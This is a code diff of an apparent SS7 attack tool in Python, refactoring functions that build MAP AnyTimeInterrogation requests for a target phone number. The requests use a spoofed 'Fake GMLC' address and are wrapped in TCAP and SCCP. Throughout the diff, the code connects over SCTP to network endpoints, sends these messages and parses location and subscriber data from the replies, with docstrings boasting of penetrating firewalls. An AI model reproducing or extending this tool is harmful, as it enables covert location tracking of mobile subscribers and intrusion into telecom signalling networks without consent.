-        if scan_variant == ScanVariant.TOTAL_DEVASTATION:
-            # Add optional GMLC number for MAXIMUM power
-            gmlc_number = build_legendary_msisdn_parameter("212600000001")  # Fake GMLC
-            ati_param.append(0xA3)  # [3] IMPLICIT for GMLC-Number
-            ati_param.append(len(gmlc_number))
-            ati_param.extend(gmlc_number)
-        
-        # Update main parameter length
-        total_length = len(ati_param) - 2
-        ati_param[param_length_pos] = total_length
-        
-        final_result = bytes(ati_param)
-        
-        # LEGENDARY validation with BRUTAL checks
-        if len(final_result) == 0:
-            raise ValueError("ATI parameter construction FAILED - ZERO LENGTH!")
-        
-        if len(final_result) < 10:
-            raise ValueError(f"ATI parameter TOO SMALL - {len(final_result)} bytes!")
-        
-        # Validate ASN.1 structure
-        if final_result[0] != 0x30:
-            raise ValueError("ATI parameter INVALID - Missing SEQUENCE tag!")
-        
-        legendary_print(f"💀 ATI parameter FORGED with DEMONIC precision: {len(final_result)} bytes", 
-                       DestroyerColors.MYTHIC_PURPLE, bold=True)
-        
-        legendary_print(f"🔍 ATI parameter hex: {final_result.hex().upper()[:80]}...", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        return final_result
-        
-    except Exception as e:
-        legendary_print(f"💥 ATI parameter construction EXPLODED: {e}", 
-                       DestroyerColors.BLOOD_RED, bold=True)
-        raise
+    mcc_digit1 = (byte1 >> 4) & 0x0F
+    mcc_digit2 = byte1 & 0x0F
+    mcc_digit3 = (byte2 >> 4) & 0x0F
+    
+    mnc_digit1 = (byte3 >> 4) & 0x0F
+    mnc_digit2 = byte3 & 0x0F
+    mnc_digit3 = byte2 & 0x0F
+    
+    if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
+        raise ValueError(f"Invalid MCC digits")
+    
+    mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
+    
+    if mnc_digit3 == 0xF:
+        if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
+            raise ValueError(f"Invalid 2-digit MNC")
+        mnc = f"{mnc_digit1}{mnc_digit2}"
+    else:
+        if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
+            raise ValueError(f"Invalid 3-digit MNC")
+        mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
+    
+    return mcc, mnc
 
-def build_legendary_invoke_component(invoke_id: int, operation: int, parameter: bytes) -> bytes:
-    """
-    Build INVOKE component with GODLIKE precision and ZERO tolerance for failure
-    This function creates INVOKE components that PENETRATE any defense
-    """
+def decode_tbcd_string(tbcd_bytes: bytes) -> str:
+    """Professional TBCD string decoder"""
+    if not tbcd_bytes:
+        return "N/A"
     
-    legendary_print(f"🔥 Forging LEGENDARY INVOKE component: ID={invoke_id}, OP={operation}", 
-                   DestroyerColors.FIRE_ORANGE, bold=True)
+    digits = []
+    for byte in tbcd_bytes:
+        digit1 = byte & 0x0F
+        digit2 = (byte >> 4) & 0x0F
+        
+        if digit1 <= 9:
+            digits.append(str(digit1))
+        if digit2 <= 9 and digit2 != 0xF:
+            digits.append(str(digit2))
     
-    try:
-        invoke_comp = bytearray()
-        
-        # INVOKE tag
-        invoke_comp.append(0xA1)  # Context-specific [1] CONSTRUCTED
-        invoke_length_pos = len(invoke_comp)
-        invoke_comp.append(0x00)  # Length placeholder
-        
-        # Invoke ID - MANDATORY
-        invoke_comp.append(0x02)  # INTEGER tag
-        invoke_comp.append(0x01)  # Length = 1
-        invoke_comp.append(invoke_id & 0xFF)  # Invoke ID value
-        
-        # Operation Code - MANDATORY  
-        invoke_comp.append(0x02)  # INTEGER tag
-        invoke_comp.append(0x01)  # Length = 1
-        invoke_comp.append(operation & 0xFF)  # Operation value
-        
-        # Parameter - OPTIONAL but CRITICAL for ATI
-        if parameter and len(parameter) > 0:
-            invoke_comp.extend(parameter)
-        
-        # Update INVOKE length
-        invoke_length = len(invoke_comp) - 2
-        if invoke_length > 127:
-            # Use long form length encoding for POWER
-            invoke_comp[invoke_length_pos] = 0x81
-            invoke_comp.insert(invoke_length_pos + 1, invoke_length & 0xFF)
-        else:
-            invoke_comp[invoke_length_pos] = invoke_length
-        
-        final_result = bytes(invoke_comp)
-        
-        # LEGENDARY validation
-        if len(final_result) == 0:
-            raise ValueError("INVOKE component construction FAILED!")
-        
-        if final_result[0] != 0xA1:
-            raise ValueError("INVOKE component INVALID tag!")
-        
-        legendary_print(f"💀 INVOKE component FORGED: {len(final_result)} bytes", 
-                       DestroyerColors.MYTHIC_PURPLE, bold=True)
-        
-        return final_result
-        
-    except Exception as e:
-        legendary_print(f"💥 INVOKE component construction EXPLODED: {e}", 
-                       DestroyerColors.BLOOD_RED, bold=True)
-        raise
+    return ''.join(digits) if digits else "N/A"
 
-def build_legendary_tcap_message(otid: bytes, scan_variant: ScanVariant, target_msisdn: str) -> bytes:
-    """
-    Build TCAP message with SUPERNATURAL power and GODLIKE precision
-    This function creates TCAP messages that OBLITERATE any resistance and GUARANTEE transmission
-    """
-    
-    legendary_print(f"🔥 FORGING LEGENDARY TCAP MESSAGE with MAXIMUM POWER!", 
-                   DestroyerColors.FIRE_RED, bold=True)
-    legendary_print(f"⚡ OTID: {otid.hex().upper()}", DestroyerColors.DIVINE_CYAN)
-    legendary_print(f"💀 Variant: {scan_variant.value}", DestroyerColors.MYTHIC_PURPLE)
-    legendary_print(f"🎯 Target: {target_msisdn}", DestroyerColors.GODLIKE_GREEN)
-    
-    try:
-        # === BUILD ATI PARAMETER WITH DEMONIC POWER ===
-        ati_parameter = build_legendary_ati_parameter(scan_variant, target_msisdn)
+def print_connection_status(ip: str, port: int, status: str, details: str = "", 
+                          color: str = Colors.WHITE, unique_id: str = ""):
+    """Print elegant connection status in organized format"""
+    with terminal_lock:
+        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
         
-        # === BUILD INVOKE COMPONENT WITH GODLIKE PRECISION ===
-        invoke_id = random.randint(1, 127)  # Random invoke ID for variety
-        invoke_component = build_legendary_invoke_component(
-            invoke_id, 
-            MAP_OPERATIONS['ANY_TIME_INTERROGATION'], 
-            ati_parameter
-        )
+        status_icons = {
+            "CONNECTING": ("🔄", Colors.BLUE),
+            "CONNECTED": ("✅", Colors.GREEN),
+            "BUILDING": ("🔨", Colors.CYAN),
+            "SENDING": ("📤", Colors.CYAN),
+            "RECEIVING": ("📥", Colors.MAGENTA),
+            "SUCCESS": ("🎯", Colors.BRIGHT_GREEN),
+            "PARTIAL_SUCCESS": ("⚡", Colors.YELLOW),
+            "ERROR": ("❌", Colors.RED),
+            "TIMEOUT": ("⏰", Colors.YELLOW),
+            "REJECTED": ("🚫", Colors.RED),
+            "FAILED": ("💥", Colors.BRIGHT_RED),
+            "PARSING": ("🔍", Colors.BLUE)
+        }
         
-        # === BUILD COMPONENT PORTION ===
-        component_portion = bytearray()
-        component_portion.append(0x6C)  # Component Portion tag
-        component_portion.append(len(invoke_component))
-        component_portion.extend(invoke_component)
+        icon, status_color = status_icons.get(status, ("ℹ️", color))
         
-        # === BUILD DIALOGUE PORTION WITH MAP v3 CONTEXT ===
-        # This is CRITICAL for proper MAP communication
-        dialogue_portion = bytearray([
-            0x6B, 0x1A,  # Dialogue Portion tag + length
-            0x28, 0x18,  # External tag + length  
-            0x06, 0x08,  # Object Identifier tag + length
-            # MAP Application Context OID v3 - CRITICAL
-            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03,
-            0xA0, 0x0C,  # [0] single-ASN1-type tag + length
-            0x60, 0x0A,  # DialogueRequest tag + length
-            0x80, 0x08,  # Application Context Name tag + length
-            # MAP v3 Application Context - REPEATED for EMPHASIS
-            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03
-        ])
+        # Create elegant status line with IP coloring
+        ip_colored = f"\033[96m{ip}\033[0m"  # Cyan IP
+        port_colored = f"\033[93m{port}\033[0m"  # Yellow port
         
-        # === BUILD TCAP BEGIN MESSAGE WITH LEGENDARY POWER ===
-        tcap_message = bytearray()
-        tcap_message.append(0x60)  # Begin tag
-        tcap_length_pos = len(tcap_message)
-        tcap_message.append(0x00)  # Length placeholder
+        status_line = f"{timestamp} [{unique_id}] {icon} {ip_colored}:{port_colored}"
+        if details:
+            status_line += f" - {details}"
         
-        # === ORIGINATING TRANSACTION ID (OTID) - MANDATORY ===
-        if len(otid) == 0:
-            raise ValueError("OTID cannot be EMPTY!")
-        
-        tcap_message.append(0x49)  # OTID tag
-        tcap_message.append(len(otid))
-        tcap_message.extend(otid)
-        
-        # === ADD DIALOGUE PORTION ===
-        tcap_message.extend(dialogue_portion)
-        
-        # === ADD COMPONENT PORTION ===  
-        tcap_message.extend(component_portion)
-        
-        # === UPDATE TCAP MESSAGE LENGTH WITH LEGENDARY PRECISION ===
-        total_length = len(tcap_message) - 2
-        
-        if total_length > 127:
-            # Use extended length form for MAXIMUM power
-            if total_length <= 255:
-                tcap_message[tcap_length_pos] = 0x81
-                tcap_message.insert(tcap_length_pos + 1, total_length)
-            else:
-                tcap_message[tcap_length_pos] = 0x82
-                tcap_message.insert(tcap_length_pos + 1, (total_length >> 8) & 0xFF)
-                tcap_message.insert(tcap_length_pos + 2, total_length & 0xFF)
-        else:
-            tcap_message[tcap_length_pos] = total_length
-        
-        final_result = bytes(tcap_message)
-        
-        # === LEGENDARY VALIDATION WITH BRUTAL PRECISION ===
-        if len(final_result) == 0:
-            raise ValueError("TCAP message construction CATASTROPHICALLY FAILED - ZERO LENGTH!")
-        
-        if len(final_result) < 30:
-            raise ValueError(f"TCAP message PATHETICALLY SMALL - {len(final_result)} bytes!")
-        
-        if final_result[0] != 0x60:
-            raise ValueError("TCAP message INVALID - Missing Begin tag!")
-        
-        # Verify OTID presence
-        otid_found = False
-        for i in range(len(final_result) - 1):
-            if final_result[i] == 0x49:  # OTID tag
-                otid_found = True
-                break
-        
-        if not otid_found:
-            raise ValueError("TCAP message INVALID - OTID not found!")
-        
-        legendary_print(f"💀 TCAP MESSAGE FORGED WITH GODLIKE POWER: {len(final_result)} bytes", 
-                       DestroyerColors.LEGENDARY_GOLD, bold=True)
-        
-        legendary_print(f"🔍 TCAP hex preview: {final_result.hex().upper()[:120]}...", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        # Calculate power level
-        power_level = (len(final_result) * len(ati_parameter) * invoke_id) % 9001
-        legendary_print(f"⚡ MESSAGE POWER LEVEL: {power_level}", 
-                       DestroyerColors.NEON_GREEN, bold=True)
-        
-        return final_result
-        
-    except Exception as e:
-        legendary_print(f"💥 TCAP MESSAGE CONSTRUCTION NUCLEAR EXPLOSION: {e}", 
-                       DestroyerColors.LASER_RED, bold=True)
-        raise
+        print_colored(status_line, status_color, bold=(status in ["SUCCESS", "FAILED", "ERROR"]))
 
-def build_legendary_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, 
-                                sccp_config: dict) -> bytes:
-    """
-    Build SCCP message with DEMONIC efficiency and GODLIKE reliability
-    This function creates SCCP messages that PENETRATE any firewall and GUARANTEE delivery
-    """
+# === Fixed SCCP Message Construction ===
+
+def build_fixed_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
+    """Build reliable SCCP UDT message with guaranteed data transmission"""
     
     if not tcap_data or len(tcap_data) == 0:
-        raise ValueError("TCAP data is EMPTY - Cannot build SCCP message!")
+        raise ValueError("TCAP data cannot be empty")
     
-    legendary_print(f"🔥 FORGING LEGENDARY SCCP MESSAGE with BRUTAL efficiency!", 
-                   DestroyerColors.FIRE_RED, bold=True)
-    legendary_print(f"📡 CDPA GT: {cdpa_gt}", DestroyerColors.DIVINE_CYAN)
-    legendary_print(f"📡 CGPA GT: {cgpa_gt}", DestroyerColors.DIVINE_CYAN) 
-    legendary_print(f"💀 TCAP payload: {len(tcap_data)} bytes", DestroyerColors.MYTHIC_PURPLE)
+    print_colored(f"🔧 Building reliable SCCP message: CDPA={cdpa_gt}, CGPA={cgpa_gt}, TCAP={len(tcap_data)}b", Colors.CYAN)
     
     try:
-        # === PREPARE GLOBAL TITLES WITH SUPERNATURAL PRECISION ===
-        # Convert GTs to ASCII encoding for MAXIMUM compatibility
-        cdpa_gt_ascii = cdpa_gt.encode('ascii')
-        cgpa_gt_ascii = cgpa_gt.encode('ascii')
-        
-        legendary_print(f"🌐 GT encoding complete: CDPA={len(cdpa_gt_ascii)}, CGPA={len(cgpa_gt_ascii)}", 
-                       DestroyerColors.GODLIKE_GREEN)
-        
-        # === BUILD SCCP UDT MESSAGE WITH GODLIKE STRUCTURE ===
-        sccp_message = bytearray()
-        
-        # === MESSAGE TYPE ===
-        sccp_message.append(0x09)  # UDT (Unitdata) message type
-        
-        # === PROTOCOL CLASS ===
-        protocol_class = random.choice(sccp_config.get('sccp_classes', [0]))
-        sccp_message.append(protocol_class)
-        
-        legendary_print(f"🎯 Protocol class selected: {protocol_class}", DestroyerColors.DESTROYER_BLUE)
-        
-        # === CALCULATE ADDRESS LENGTHS WITH LEGENDARY PRECISION ===
-        # Address structure: Length + AI + SSN + GTI + TT + NP_ES + GT
-        gt_indicator = random.choice(sccp_config.get('gt_indicators', [4]))
-        translation_type = random.choice(sccp_config.get('translation_types', [0]))
-        
-        if gt_indicator == 2:
-            # GT Indicator 2: TT only
-            cdpa_len = 1 + 1 + 1 + 1 + len(cdpa_gt_ascii)  # AI + SSN + GTI + TT + GT
-            cgpa_len = 1 + 1 + 1 + 1 + len(cgpa_gt_ascii)
-        else:
-            # GT Indicator 4: TT + NP + NAI + ES
-            cdpa_len = 1 + 1 + 1 + 1 + 1 + 1 + len(cdpa_gt_ascii)  # AI + SSN + GTI + TT + NP + ES + GT
-            cgpa_len = 1 + 1 + 1 + 1 + 1 + 1 + len(cgpa_gt_ascii)
-        
-        # === POINTER CALCULATION WITH MATHEMATICAL PRECISION ===
-        ptr_cdpa = 3  # Always 3 for UDT
-        ptr_cgpa = ptr_cdpa + cdpa_len
-        ptr_data = ptr_cgpa + cgpa_len
-        
-        # Add pointers
-        sccp_message.append(ptr_cdpa)
-        sccp_message.append(ptr_cgpa)
-        sccp_message.append(ptr_data)
-        
-        legendary_print(f"📍 Pointers calculated: CDPA={ptr_cdpa}, CGPA={ptr_cgpa}, Data={ptr_data}", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        # === BUILD CALLED PARTY ADDRESS (CDPA) WITH DEMONIC PRECISION ===
-        sccp_message.append(cdpa_len - 1)  # Address length (excluding length byte)
-        sccp_message.append(0x43)  # Address Indicator: GT + SSN present
-        sccp_message.append(sccp_config['cdpa_ssn'])  # Subsystem Number
-        
-        # GT Indicator and Translation Type
-        if gt_indicator == 2:
-            sccp_message.append(0x02)  # GT Indicator 2
-            sccp_message.append(translation_type)  # Translation Type
-        else:
-            sccp_message.append(0x12)  # GT Indicator 4 
-            sccp_message.append(translation_type)  # Translation Type
-            sccp_message.append(0x14)  # Numbering Plan (ISDN) + NAI (International)
-            sccp_message.append(0x02)  # Encoding Scheme (BCD even)
-        
-        # Add GT digits
-        sccp_message.extend(cdpa_gt_ascii)
-        
-        # === BUILD CALLING PARTY ADDRESS (CGPA) WITH GODLIKE PRECISION ===
-        sccp_message.append(cgpa_len - 1)  # Address length
-        sccp_message.append(0x43)  # Address Indicator: GT + SSN present
-        sccp_message.append(sccp_config['cgpa_ssn'])  # Subsystem Number
-        
-        # GT Indicator and Translation Type (same as CDPA)
-        if gt_indicator == 2:
-            sccp_message.append(0x02)  # GT Indicator 2
-            sccp_message.append(translation_type)  # Translation Type
-        else:
-            sccp_message.append(0x12)  # GT Indicator 4
-            sccp_message.append(translation_type)  # Translation Type  
-            sccp_message.append(0x14)  # Numbering Plan + NAI
-            sccp_message.append(0x02)  # Encoding Scheme
-        
-        # Add GT digits
-        sccp_message.extend(cgpa_gt_ascii)
-        
-        # === ADD DATA PORTION WITH BRUTAL EFFICIENCY ===
-        sccp_message.append(len(tcap_data))  # Data length
-        sccp_message.extend(tcap_data)  # TCAP payload
-        
-        final_result = bytes(sccp_message)
-        
-        # === LEGENDARY VALIDATION WITH NUCLEAR PRECISION ===
-        if len(final_result) == 0:
-            raise ValueError("SCCP message construction CATASTROPHICALLY FAILED - ZERO LENGTH!")
-        
-        expected_min_size = len(tcap_data) + cdpa_len + cgpa_len + 10
-        if len(final_result) < expected_min_size:
-            raise ValueError(f"SCCP message PATHETICALLY SMALL: {len(final_result)} < {expected_min_size}")
-        
-        # Verify message type
-        if final_result[0] != 0x09:
-            raise ValueError("SCCP message INVALID - Wrong message type!")
-        
-        # Verify data portion
-        data_start = ptr_data + 1  # +1 for data length byte
-        if data_start + len(tcap_data) > len(final_result):
-            raise ValueError("SCCP message CORRUPTED - Data portion mismatch!")
-        
-        legendary_print(f"💀 SCCP MESSAGE FORGED WITH DEMONIC POWER: {len(final_result)} bytes", 
-                       DestroyerColors.LEGENDARY_GOLD, bold=True)
-        
-        legendary_print(f"📊 SCCP details: UDT, Class={protocol_class}, GTI={gt_indicator}, TT={translation_type}", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        legendary_print(f"🔍 SCCP hex preview: {final_result.hex().upper()[:120]}...", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        # Calculate destruction level
-        destruction_level = (len(final_result) * protocol_class * gt_indicator) % 1000
-        legendary_print(f"💥 MESSAGE DESTRUCTION LEVEL: {destruction_level}", 
-                       DestroyerColors.FIRE_ORANGE, bold=True)
-        
-        return final_result
-        
+        # Use Pycrate if available
+        if PYCRATE['SCCP'] is not None:
+            return build_pycrate_sccp_message(cdpa_gt, cgpa_gt, tcap_data, sccp_config)
     except Exception as e:
-        legendary_print(f"💥 SCCP MESSAGE CONSTRUCTION NUCLEAR MELTDOWN: {e}", 
-                       DestroyerColors.LASER_RED, bold=True)
-        raise
-
-# === 🔌 LEGENDARY CONNECTION SYSTEM ===
-
-def create_legendary_socket() -> Any:
-    """Create socket with GODLIKE properties and SUPERNATURAL reliability"""
-    try:
-        legendary_print("🔥 Creating LEGENDARY socket with GODLIKE properties...", 
-                       DestroyerColors.FIRE_ORANGE, bold=True)
-        
-        # Create SCTP socket with MAXIMUM power
-        sock = DESTROYER_DEPS['sctp'].sctpsocket_tcp(socket.AF_INET)
-        
-        # Apply LEGENDARY socket options for MAXIMUM reliability
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)  # Large receive buffer
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Large send buffer
-        
-        # Set LEGENDARY timeouts
-        sock.settimeout(DESTROYER_CONFIG['connection_timeout'])
-        
-        legendary_print("⚡ LEGENDARY socket created with SUPERNATURAL power!", 
-                       DestroyerColors.GODLIKE_GREEN, bold=True)
-        
-        return sock
-        
-    except Exception as e:
-        legendary_print(f"💥 Socket creation EXPLODED: {e}", DestroyerColors.BLOOD_RED, bold=True)
-        raise
-
-def legendary_connect(sock: Any, ip: str, port: int) -> float:
-    """Connect with DEMONIC speed and GODLIKE precision"""
-    try:
-        legendary_print(f"🔥 Establishing LEGENDARY connection to {ip}:{port}...", 
-                       DestroyerColors.FIRE_ORANGE, bold=True)
-        
-        start_time = time.time()
-        sock.connect((ip, port))
-        connection_time = (time.time() - start_time) * 1000
-        
-        legendary_print(f"⚡ CONNECTION ESTABLISHED with GODLIKE speed: {connection_time:.1f}ms", 
-                       DestroyerColors.GODLIKE_GREEN, bold=True)
-        
-        return connection_time
-        
-    except Exception as e:
-        legendary_print(f"💥 Connection FAILED with CATASTROPHIC error: {e}", 
-                       DestroyerColors.BLOOD_RED, bold=True)
-        raise
-
-def legendary_transmission(sock: Any, data: bytes, ip: str, port: int) -> int:
-    """
-    Perform data transmission with GODLIKE guarantee and ZERO tolerance for failure
-    This function OBLITERATES transmission issues with SUPERNATURAL power
-    """
+        print_colored(f"⚠️  Pycrate SCCP failed: {e}, using manual construction", Colors.YELLOW)
     
-    if not data or len(data) == 0:
-        raise ValueError("CANNOT TRANSMIT EMPTY DATA - This would be PATHETIC!")
+    # Reliable manual construction
+    return build_manual_sccp_message_fixed(cdpa_gt, cgpa_gt, tcap_data, sccp_config)
+
+def build_pycrate_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
+    """Build SCCP message using Pycrate with proper error handling"""
     
-    legendary_print(f"📤 INITIATING LEGENDARY TRANSMISSION: {len(data)} bytes to {ip}:{port}", 
-                   DestroyerColors.FIRE_RED, bold=True)
+    sccp_udt = PYCRATE['SCCP'].SCCPUnitData()
+    
+    # Set protocol class
+    proto_class = random.choice(sccp_config.get('sccp_proto_class_pool', [0]))
+    sccp_udt['ProtocolClass']['Class'].set_val(proto_class)
+    sccp_udt['ProtocolClass']['Handling'].set_val(0)
+    
+    # Called Party Address (CDPA)
+    cdpa = sccp_udt['CalledPartyAddr']['Value']
+    cdpa['AddrInd']['RoutingInd'].set_val(0)  # Route on GT
+    cdpa['AddrInd']['GTInd'].set_val(4)  # GT includes TT, NP, ES, NAI
+    cdpa['AddrInd']['SSNInd'].set_val(1)  # SSN present
+    cdpa['AddrInd']['PCInd'].set_val(0)  # PC not present
+    
+    cdpa['SSN'].set_val(sccp_config['cdpa_ssn'])
+    
+    # Set Global Title for CDPA
+    gt_cdpa = cdpa['GT']
+    gt_cdpa['TranslationType'].set_val(0)
+    gt_cdpa['NumberingPlan'].set_val(1)
+    gt_cdpa['EncodingScheme'].set_val(2)  # BCD, even number of digits
+    gt_cdpa['NAI'].set_val(4)  # International number
+    
+    # Manual BCD encoding for GT
+    if hasattr(gt_cdpa['Addr'], 'set_addr_bcd'):
+        gt_cdpa['Addr'].set_addr_bcd(cdpa_gt)
+    else:
+        gt_cdpa['Addr']['BCD'].encode(cdpa_gt)
+    
+    # Calling Party Address (CGPA)
+    cgpa = sccp_udt['CallingPartyAddr']['Value']
+    cgpa['AddrInd']['RoutingInd'].set_val(0)
+    cgpa['AddrInd']['GTInd'].set_val(4)
+    cgpa['AddrInd']['SSNInd'].set_val(1)
+    cgpa['AddrInd']['PCInd'].set_val(0)
+    
+    cgpa['SSN'].set_val(sccp_config['cgpa_ssn'])
+    
+    # Set Global Title for CGPA
+    gt_cgpa = cgpa['GT']
+    gt_cgpa['TranslationType'].set_val(0)
+    gt_cgpa['NumberingPlan'].set_val(1)
+    gt_cgpa['EncodingScheme'].set_val(2)
+    gt_cgpa['NAI'].set_val(4)
+    
+    if hasattr(gt_cgpa['Addr'], 'set_addr_bcd'):
+        gt_cgpa['Addr'].set_addr_bcd(cgpa_gt)
+    else:
+        gt_cgpa['Addr']['BCD'].encode(cgpa_gt)
+    
+    # Data
+    sccp_udt['Data']['Value'].set_val(tcap_data)
+    
+    result = sccp_udt.to_bytes()
+    
+    if len(result) == 0:
+        raise ValueError("Pycrate generated empty SCCP message")
+    
+    print_colored(f"✅ Pycrate SCCP message built: {len(result)} bytes", Colors.GREEN)
+    return result
+
+def build_manual_sccp_message_fixed(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, sccp_config: Dict) -> bytes:
+    """Build SCCP UDT message manually with guaranteed reliability"""
+    
+    print_colored(f"🔧 Manual SCCP construction: CDPA={cdpa_gt}, CGPA={cgpa_gt}", Colors.CYAN)
+    
+    sccp_msg = bytearray()
+    
+    # Message type - UDT
+    sccp_msg.append(0x09)
+    
+    # Protocol class
+    proto_class = random.choice(sccp_config.get('sccp_proto_class_pool', [0]))
+    sccp_msg.append(proto_class)
+    
+    # Encode Global Titles as ASCII
+    cdpa_gt_bytes = cdpa_gt.encode('ascii')
+    cgpa_gt_bytes = cgpa_gt.encode('ascii')
+    
+    # Calculate lengths
+    cdpa_len = 6 + len(cdpa_gt_bytes)  # AI + SSN + GTI + TT + NP+NAI + ES + GT
+    cgpa_len = 6 + len(cgpa_gt_bytes)
+    
+    # Pointers
+    sccp_msg.append(0x03)  # Pointer to CDPA (fixed)
+    sccp_msg.append(0x03 + cdpa_len)  # Pointer to CGPA
+    sccp_msg.append(0x03 + cdpa_len + cgpa_len)  # Pointer to Data
+    
+    # Called Party Address (CDPA)
+    sccp_msg.append(cdpa_len - 1)  # Length (excluding length byte)
+    sccp_msg.append(0x43)  # Address indicator: GT + SSN
+    sccp_msg.append(sccp_config['cdpa_ssn'])  # SSN
+    sccp_msg.append(0x12)  # Global Title Indicator 4
+    sccp_msg.append(0x00)  # Translation Type
+    sccp_msg.append((1 << 4) | 4)  # NumberingPlan=1, NAI=4
+    sccp_msg.append(0x02)  # Encoding Scheme=2 (BCD even)
+    sccp_msg.extend(cdpa_gt_bytes)
+    
+    # Calling Party Address (CGPA)
+    sccp_msg.append(cgpa_len - 1)  # Length
+    sccp_msg.append(0x43)  # Address indicator: GT + SSN
+    sccp_msg.append(sccp_config['cgpa_ssn'])  # SSN
+    sccp_msg.append(0x12)  # Global Title Indicator 4
+    sccp_msg.append(0x00)  # Translation Type
+    sccp_msg.append((1 << 4) | 4)  # NumberingPlan=1, NAI=4
+    sccp_msg.append(0x02)  # Encoding Scheme=2
+    sccp_msg.extend(cgpa_gt_bytes)
+    
+    # Data portion
+    sccp_msg.append(len(tcap_data))  # Data length
+    sccp_msg.extend(tcap_data)
+    
+    result = bytes(sccp_msg)
+    
+    if len(result) == 0:
+        raise ValueError("Manual SCCP construction resulted in empty message")
+    
+    print_colored(f"✅ Manual SCCP message built: {len(result)} bytes", Colors.GREEN)
+    
+    if logger:
+        logger.debug(f"Manual SCCP hex: {result.hex()}")
+    
+    return result
+
+# === Enhanced TCAP Message Construction ===
+
+def build_professional_tcap_message(otid: bytes, ati_variant: AtiVariant, target_msisdn: str) -> bytes:
+    """Build professional TCAP message with reliable construction"""
+    
+    print_colored(f"🔧 Building TCAP message: variant={ati_variant.value}, MSISDN={target_msisdn}", Colors.CYAN)
     
     try:
-        # Set transmission timeout with LEGENDARY precision
-        sock.settimeout(DESTROYER_CONFIG['response_timeout'])
-        
-        # === THE LEGENDARY TRANSMISSION OPERATION ===
-        transmission_start = time.time()
-        bytes_sent = sock.send(data)
-        transmission_time = (time.time() - transmission_start) * 1000
-        
-        legendary_print(f"📊 TRANSMISSION RESULT: {bytes_sent} bytes transmitted in {transmission_time:.2f}ms", 
-                       DestroyerColors.DESTROYER_BLUE, bold=True)
-        
-        # === LEGENDARY VALIDATION WITH BRUTAL PRECISION ===
-        if bytes_sent == 0:
-            raise ValueError("TRANSMISSION CATASTROPHICALLY FAILED - ZERO BYTES SENT!")
-        
-        if bytes_sent != len(data):
-            legendary_print(f"⚠️  PARTIAL TRANSMISSION detected: Expected {len(data)}, sent {bytes_sent}", 
-                           DestroyerColors.FIRE_ORANGE, bold=True)
-            legendary_print("🔥 This may indicate NETWORK RESISTANCE - ACCEPTABLE for now", 
-                           DestroyerColors.FIRE_ORANGE)
-        else:
-            legendary_print(f"💀 FULL TRANSMISSION ACHIEVED: {bytes_sent} bytes of PURE DESTRUCTION", 
-                           DestroyerColors.GODLIKE_GREEN, bold=True)
-        
-        # Calculate transmission power
-        transmission_power = int((bytes_sent * 1000) / (transmission_time + 1))
-        legendary_print(f"⚡ TRANSMISSION POWER: {transmission_power} bytes/second", 
-                       DestroyerColors.NEON_GREEN, bold=True)
-        
-        return bytes_sent
-        
-    except socket.timeout:
-        legendary_print(f"⏰ TRANSMISSION TIMEOUT - Network shows RESISTANCE to our power", 
-                       DestroyerColors.FIRE_ORANGE, bold=True)
-        raise
+        # Try Pycrate first if available
+        if PYCRATE['TCAP_defs'] is not None:
+            return build_pycrate_tcap_message(otid, ati_variant, target_msisdn)
     except Exception as e:
-        legendary_print(f"💥 TRANSMISSION EXPLODED with error: {e}", 
-                       DestroyerColors.LASER_RED, bold=True)
-        raise
-
-def legendary_reception(sock: Any, ip: str, port: int) -> Optional[bytes]:
-    """Receive response with DEMONIC patience and GODLIKE precision"""
-    try:
-        legendary_print(f"📥 AWAITING RESPONSE from {ip}:{port} with LEGENDARY patience...", 
-                       DestroyerColors.DESTROYER_BLUE)
-        
-        reception_start = time.time()
-        response = sock.recv(8192)
-        reception_time = (time.time() - reception_start) * 1000
-        
-        if response:
-            legendary_print(f"⚡ RESPONSE RECEIVED: {len(response)} bytes in {reception_time:.2f}ms", 
-                           DestroyerColors.GODLIKE_GREEN, bold=True)
-            
-            # Calculate reception power
-            reception_power = int((len(response) * 1000) / (reception_time + 1))
-            legendary_print(f"💀 RECEPTION POWER: {reception_power} bytes/second", 
-                           DestroyerColors.MYTHIC_PURPLE)
-            
-            return response
-        else:
-            legendary_print(f"⚠️  EMPTY RESPONSE from {ip}:{port} - Target shows SILENCE", 
-                           DestroyerColors.FIRE_ORANGE)
-            return None
-            
-    except socket.timeout:
-        legendary_print(f"⏰ RECEPTION TIMEOUT from {ip}:{port} - Target REFUSES to respond", 
-                       DestroyerColors.FIRE_ORANGE)
-        return None
-    except Exception as e:
-        legendary_print(f"💥 RECEPTION ERROR: {e}", DestroyerColors.BLOOD_RED)
-        return None
-
-# === 🧠 LEGENDARY RESPONSE ANALYZER ===
-
-def analyze_legendary_response(response_data: bytes, unique_id: str) -> dict:
-    """
-    Analyze response with SUPERNATURAL intelligence and DEMONIC pattern recognition
-    This function EXTRACTS every bit of information with GODLIKE precision
-    """
+        print_colored(f"⚠️  Pycrate TCAP failed: {e}, using manual construction", Colors.YELLOW)
     
-    if not response_data:
-        return {
-            "success": False,
-            "destruction_level": "NONE",
-            "tcap_outcome": "NoResponse",
-            "location_info": LegendaryLocationInfo(),
-            "subscriber_info": LegendarySubscriberInfo(),
-            "info": "No response data received"
+    # Reliable manual construction
